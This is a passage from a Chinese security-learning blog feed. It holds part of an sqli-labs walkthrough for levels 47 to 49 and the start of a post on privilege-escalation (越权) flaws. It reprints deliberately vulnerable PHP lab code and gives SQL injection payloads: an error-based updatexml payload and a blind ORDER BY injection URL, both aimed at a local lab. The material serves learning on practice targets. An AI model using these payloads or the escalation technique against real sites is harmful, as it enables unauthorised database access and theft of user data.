class="string">&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">while ($row = mysql_fetch_assoc($result))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo '</span>&lt;font color= <span class="string">"#00FF11"</span> size=<span class="string">"3"</span>&gt;<span class="string">';</span></span><br><span class="line"><span class="string">echo "&lt;tr&gt;";</span></span><br><span class="line"><span class="string">    echo "&lt;td&gt;".$row['</span>id<span class="string">']."&lt;/td&gt;";</span></span><br><span class="line"><span class="string">    echo "&lt;td&gt;".$row['</span>username<span class="string">']."&lt;/td&gt;";</span></span><br><span class="line"><span class="string">    echo "&lt;td&gt;".$row['</span>password<span class="string">']."&lt;/td&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;/tr&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;/font&gt;";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">echo "&lt;/table&gt;";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo '</span>&lt;font color= <span class="string">"#FFFF00"</span>&gt;<span class="string">';</span></span><br><span class="line"><span class="string">print_r(mysql_error());</span></span><br><span class="line"><span class="string">echo "&lt;/font&gt;";  </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo "Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;br&gt;&lt;br&gt;&lt;br&gt;";</span></span><br><span class="line"><span class="string">echo '</span>&lt;img src=<span class="string">"../images/Less-47.jpg"</span> /&gt;&lt;br&gt;<span class="string">';</span></span><br><span class="line"><span class="string">echo "Lesson Concept and code Idea by &lt;b&gt;D4rk&lt;/b&gt;";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/center&gt; </span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></p><p>查询语句是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by id=&apos;1&apos;</span><br></pre></td></tr></table></figure></p><p>我们要闭合查询语句，注入语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1)|&apos;1</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/11/kaBYAe.png" alt=""></p><p><b>第四十八关</b></p><hr><p>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:70px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">$id=$_GET[<span class="string">'sort'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($id))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'SORT:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY $id"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> ($result)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;font color= <span class="string">"#00FF00"</span> size=<span class="string">"4"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;table   border=<span class="number">1</span><span class="string">'&gt;</span></span><br><span class="line"><span class="string">&lt;tr&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;/tr&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">while ($row = mysql_fetch_assoc($result))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo '</span>&lt;font color= <span class="string">"#00FF11"</span> size=<span class="string">"3"</span>&gt;<span class="string">';</span></span><br><span class="line"><span class="string">echo "&lt;tr&gt;";</span></span><br><span class="line"><span class="string">    echo "&lt;td&gt;".$row['</span>id<span class="string">']."&lt;/td&gt;";</span></span><br><span class="line"><span class="string">    echo "&lt;td&gt;".$row['</span>username<span class="string">']."&lt;/td&gt;";</span></span><br><span class="line"><span class="string">    echo "&lt;td&gt;".$row['</span>password<span class="string">']."&lt;/td&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;/tr&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;/font&gt;";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">echo "&lt;/table&gt;";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo "Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;br&gt;&lt;br&gt;&lt;br&gt;";</span></span><br><span class="line"><span class="string">echo '</span>&lt;img src=<span class="string">"../images/Less-47.jpg"</span> /&gt;&lt;br&gt;<span class="string">';</span></span><br><span class="line"><span class="string">echo "Lesson Concept and code Idea by &lt;b&gt;D4rk&lt;/b&gt;";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/center&gt; </span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></p><p>由于没有输出mysql报错，只能盲注了<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-48/?sort=rand(length(database())=8)</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/11/karj0K.md.png" alt=""></p><p><b>第四十九关</b></p><hr><p>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:70px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">$id=$_GET[<span class="string">'sort'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($id))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'SORT:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY '$id'"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> ($result)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;font color= <span class="string">"#00FF00"</span> size=<span class="string">"4"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;table   border=<span class="number">1</span><span class="string">'&gt;</span></span><br><span class="line"><span class="string">&lt;tr&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;/tr&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">while ($row = mysql_fetch_assoc($result))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo '</span>&lt;font color= <span class="string">"#00FF11"</span> size=<span class="string">"3"</span>&gt;<span class="string">';</span></span><br><span class="line"><span class="string">echo "&lt;tr&gt;";</span></span><br><span class="line"><span class="string">    echo "&lt;td&gt;".$row['</span>id<span class="string">']."&lt;/td&gt;";</span></span><br><span class="line"><span class="string">    echo "&lt;td&gt;".$row['</span>username<span class="string">']."&lt;/td&gt;";</span></span><br><span class="line"><span class="string">    echo "&lt;td&gt;".$row['</span>password<span class="string">']."&lt;/td&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;/tr&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;/font&gt;";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">echo "&lt;/table&gt;";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo "Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;br&gt;&lt;br&gt;&lt;br&gt;";</span></span><br><span class="line"><span class="string">echo '</span>&lt;img src=<span class="string">"../images/Less-47.jpg"</span> /&gt;&lt;br&gt;<span class="string">';</span></span><br><span class="line"><span class="string">echo "Lesson Concept and code by &lt;b&gt;D4rk&lt;/b&gt;";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/center&gt; </span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></p><p>和第47关一样没有回显，只能使用盲注和延时注入</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Over-authority learning</title>
      <link href="/posts/a51c9bbc.html"/>
      <url>/posts/a51c9bbc.html</url>
      <content type="html"><![CDATA[<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul><li>前言</li><li>越权漏洞学习</li><li>总结</li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天学习了越权漏洞，对此漏洞了解和总结了一些方法。感觉还行<img src="https://image.uc.cn/o/wemedia/s/upload/2018/7fc84bb15e045e857e822f83a5f10d95.jpg;,4,jpegx;3,700x.jpg" alt=""></p><h2 id="越权漏洞学习"><a href="#越权漏洞学习" class="headerlink" title="越权漏洞学习"></a>越权漏洞学习</h2><hr><ul><li>越权漏洞的形成</li><li>越权分类</li><li>其他越权</li><li>实验</li></ul><p><b>越权漏洞的形成</b></p><hr><p>由于程序员在处理数据查询的时候，没有对查询参数进行越权判断。导致越权漏洞的发生，这个漏洞 可以说是极为威胁的。因为在漏洞处你可以获取整站的数据，甚至将自己提升为管理员权限<br><b>越权分类</b></p><hr><p>越权限漏洞分为两类：</p><ul><li>平行越权</li><li>垂直越权</li></ul><p>平行越权：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改存在越权漏洞的参数可以查询到别人的信息</span><br></pre></td></tr></table></figure></p><p>垂直越权<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">比如在登录的时候有个参数用来判断是什么权限，1是管理员权限，0是普通用户权限。那么我修改</span><br><span class="line">这个id即可达到用普通用户登录但拥有管理员权限，这就是垂直越权。</span><br></pre></td></tr></table></figure></p><p><b>其他越权</b></p><hr><p>越权不是只有web才有，其他的也有。比如软件，插件，其他的一些东东<br>文章：<a href="https://paper.tuisec.win/detail/536a63379b2ad55" target="_blank" rel="noopener">使用MailSniper越权访问Exchange邮箱</a></p><p><b>实验</b></p><hr><p>我们来看个存在平行越权漏洞的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by runner.han</span></span><br><span class="line"><span class="comment"> * There is nothing new under the sun</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$SELF_PAGE = substr($_SERVER[<span class="string">'PHP_SELF'</span>],strrpos($_SERVER[<span class="string">'PHP_SELF'</span>],<span class="string">'/'</span>)+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($SELF_PAGE = <span class="string">"op1_login.php"</span>)&#123;</span><br><span class="line">    $ACTIVE = <span class="keyword">array</span>(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">'active open'</span>,<span class="string">''</span>,<span class="string">'active'</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line">$PIKA_ROOT_DIR =  <span class="string">"../../../"</span>;</span><br><span class="line"><span class="keyword">include_once</span> $PIKA_ROOT_DIR . <span class="string">'header.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> $PIKA_ROOT_DIR.<span class="string">'inc/mysql.inc.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> $PIKA_ROOT_DIR.<span class="string">'inc/function.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> $PIKA_ROOT_DIR.<span class="string">'inc/config.inc.php'</span>;</span><br><span class="line"></span><br><span class="line">$link=connect();</span><br><span class="line"><span class="comment">// 判断是否登录，没有登录不能访问</span></span><br><span class="line"><span class="keyword">if</span>(!check_op_login($link))&#123;</span><br><span class="line">    header(<span class="string">"location:op1_login.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$html=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]) &amp;&amp; $_GET[<span class="string">'username'</span>]!=<span class="keyword">null</span>)&#123;</span><br><span class="line">    <span class="comment">//没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定</span></span><br><span class="line">    $username=escape($link, $_GET[<span class="string">'username'</span>]);</span><br><span class="line">    $query=<span class="string">"select * from member where username='$username'"</span>; <span class="comment">/*没有任何判断的$usernaem,而且变量可控，通过修改username可达到水平越权*/</span></span><br><span class="line">    $result=execute($link, $query);</span><br><span class="line">    <span class="keyword">if</span>(mysqli_num_rows($result)==<span class="number">1</span>)&#123;</span><br><span class="line">        $data=mysqli_fetch_assoc($result);</span><br><span class="line">        $uname=$data[<span class="string">'username'</span>];</span><br><span class="line">        $sex=$data[<span class="string">'sex'</span>];</span><br><span class="line">        $phonenum=$data[<span class="string">'phonenum'</span>];</span><br><span class="line">        $add=$data[<span class="string">'address'</span>];</span><br><span class="line">        $email=$data[<span class="string">'email'</span>];</span><br><span class="line"></span><br><span class="line">        $html.=<span class="string">&lt;&lt;&lt;A</span></span><br><span class="line"><span class="string">&lt;div id="per_info"&gt;</span></span><br><span class="line"><span class="string">   &lt;h1 class="per_title"&gt;hello,<span class="subst">&#123;$uname&#125;</span>,你的具体信息如下：&lt;/h1&gt;</span></span><br><span class="line"><span class="string">   &lt;p class="per_name"&gt;姓名:<span class="subst">&#123;$uname&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">   &lt;p class="per_sex"&gt;性别:<span class="subst">&#123;$sex&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">   &lt;p class="per_phone"&gt;手机:<span class="subst">&#123;$phonenum&#125;</span>&lt;/p&gt;    </span></span><br><span class="line"><span class="string">   &lt;p class="per_add"&gt;住址:<span class="subst">&#123;$add&#125;</span>&lt;/p&gt; </span></span><br><span class="line"><span class="string">   &lt;p class="per_email"&gt;邮箱:<span class="subst">&#123;$email&#125;</span>&lt;/p&gt; </span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">A;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'logout'</span>]) &amp;&amp; $_GET[<span class="string">'logout'</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">    session_unset();</span><br><span class="line">    session_destroy();</span><br><span class="line">    setcookie(session_name(),<span class="string">''</span>,time()<span class="number">-3600</span>,<span class="string">'/'</span>);</span><br><span class="line">    header(<span class="string">"location:op1_login.php"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span 